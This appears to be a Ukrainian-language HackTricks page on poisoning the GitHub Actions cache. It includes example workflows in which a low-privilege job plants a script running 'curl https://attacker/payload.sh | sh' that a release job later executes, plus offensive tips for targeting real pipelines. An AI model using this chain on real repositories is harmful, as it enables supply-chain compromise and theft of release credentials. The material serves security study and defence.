# GH Actions - Cache Poisoning

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Кеш GitHub Actions є глобальним для репозиторію. Будь-який workflow, який знає cache `key` (або `restore-keys`), може заповнити цей запис, навіть якщо job має лише `permissions: contents: read`. GitHub не сегрегує кеші за workflow, типом події або рівнем довіри, тому атакуючий, який компрометує job з низькими привілеями, може отруїти кеш, який привілейована release job пізніше відновить. Саме так компрометація Ultralytics перекинулася з workflow `pull_request_target` у пайплайн публікації PyPI.

## Примітиви атаки

- `actions/cache` надає операції відновлення та збереження (`actions/cache@v4`, `actions/cache/save@v4`, `actions/cache/restore@v4`). Виклик збереження дозволено для будь-якої job, окрім справді недовірених `pull_request` workflows, викликаних із форків.
- Записи кешу ідентифікуються виключно за `key`. Широкі `restore-keys` полегшують інжекцію payloads, оскільки атакуючому потрібно лише спричинити колізію по префіксу.
- Кешований файловий простір відновлюється дослівно. Якщо кеш містить скрипти або бінарні файли, що виконуються пізніше, атакуючий контролює цей шлях виконання.

## Приклад ланцюга експлуатації

_Workflow автора (`pull_request_target`) отруїв кеш:_
```yaml
steps:
- run: |
mkdir -p toolchain/bin
printf '#!/bin/sh\ncurl https://attacker/payload.sh | sh\n' > toolchain/bin/build
chmod +x toolchain/bin/build
- uses: actions/cache/save@v4
with:
path: toolchain
key: linux-build-${{ hashFiles('toolchain.lock') }}
```
_Привілейований workflow відновився та виконав poisoned cache:_
```yaml
steps:
- uses: actions/cache/restore@v4
with:
path: toolchain
key: linux-build-${{ hashFiles('toolchain.lock') }}
- run: toolchain/bin/build release.tar.gz
```
Другий job тепер виконує код, контрольований атакуючим, маючи при собі облікові дані для релізу (PyPI tokens, PATs, cloud deploy keys, etc.).

## Практичні поради щодо експлуатації

- Націлюйтеся на workflows, що запускаються через `pull_request_target`, `issue_comment` або команди ботів, які все ще зберігають кеші; GitHub дозволяє їм перезаписувати ключі для всього репозиторію навіть коли runner має лише доступ для читання репо.
- Шукайте детерміновані ключі кешу, які повторно використовуються через межі довіри (наприклад, `pip-${{ hashFiles('poetry.lock') }}`) або ліберальні `restore-keys`, після чого збережіть свій шкідливий tarball перед запуском привілейованого workflow.
- Моніторте логи на записи `Cache saved` або додайте власний крок збереження кешу, щоб наступний release job відновив payload і виконав троянізовані скрипти чи бінарні файли.

## Джерела

- [A Survey of 2024–2025 Open-Source Supply-Chain Compromises and Their Root Causes](https://words.filippo.io/compromise-survey/)

{{#include ../../../banners/hacktricks-training.md}}
